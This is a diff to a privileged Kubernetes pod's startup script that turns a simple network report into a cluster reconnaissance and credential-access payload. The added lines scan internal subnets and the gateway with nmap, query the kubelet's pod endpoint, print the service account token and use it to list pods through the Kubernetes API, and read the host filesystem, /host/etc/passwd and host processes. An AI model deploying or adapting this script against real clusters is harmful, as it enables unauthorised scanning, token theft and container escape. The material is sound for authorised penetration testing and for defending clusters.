@@ -13,17 +13,58 @@ spec:
       - /bin/sh
       - -c
       - |
-        apk add --no-cache nmap curl iproute2 bind-tools > /dev/null 2>&1
-        echo "=== IP ===" > /tmp/report.txt
-        ip a >> /tmp/report.txt
-        echo "=== ROUTE ===" >> /tmp/report.txt
-        ip route >> /tmp/report.txt
-        echo "=== DNS ===" >> /tmp/report.txt
-        cat /etc/resolv.conf >> /tmp/report.txt
-        echo "=== PING ===" >> /tmp/report.txt
-        ping -c 2 10.0.0.1 >> /tmp/report.txt 2>&1
-        echo "=== NMAP ===" >> /tmp/report.txt
-        nmap -p 22,80,443,3306,5432 10.0.0.0/24 >> /tmp/report.txt 2>&1
+        echo "[*] Installing tools..."
+        apk add --no-cache nmap curl iproute2 bind-tools net-tools util-linux procps > /dev/null 2>&1
+        echo "[*] Tools installed"
+
+        echo "=== HOSTNAME ==="
+        hostname
+
+        echo "=== IP ADDRESSES ==="
+        ip a
+
+        echo "=== ROUTES ==="
+        ip route
+
+        echo "=== DNS ==="
+        cat /etc/resolv.conf
+
+        echo "=== ARP TABLE ==="
+        arp -a 2>/dev/null || true
+
+        echo "=== HOSTS FILE ==="
+        cat /etc/hosts
+
+        echo "=== PING GATEWAY ==="
+        GW=$(ip route | awk '/default/ {print $3}')
+        ping -c 2 "$GW" 2>&1 || true
+
+        echo "=== NMAP INTERNAL SUBNET (172.30.0.0/24) ==="
+        nmap -sT -p 22,80,443,3306,5432,6379,8080,8443,9200,27017 172.30.0.0/24 2>&1 || true
+
+        echo "=== NMAP GATEWAY COMMON PORTS ==="
+        nmap -sT -p 1-1000 "$GW" 2>&1 || true
+
+        echo "=== KUBELET ==="
+        curl -sk https://172.30.0.15:10250/pods 2>&1 || true
+
+        echo "=== SERVICE ACCOUNT TOKEN ==="
+        head -c 200 /var/run/secrets/kubernetes.io/serviceaccount/token
+        echo ""
+
+        echo "=== KUBERNETES API PODS ==="
+        curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/pods 2>&1 || true
+
+        echo "=== HOST FILESYSTEM (/host) ==="
+        ls -la /host 2>&1 || true
+
+        echo "=== HOST PASSWD ==="
+        cat /host/etc/passwd 2>&1 || true
+
+        echo "=== HOST PROCESSES (hostPID) ==="
+        ps aux 2>&1 || true
+
+        echo "=== DONE ==="
         sleep 36000
     securityContext:
       privileged: true
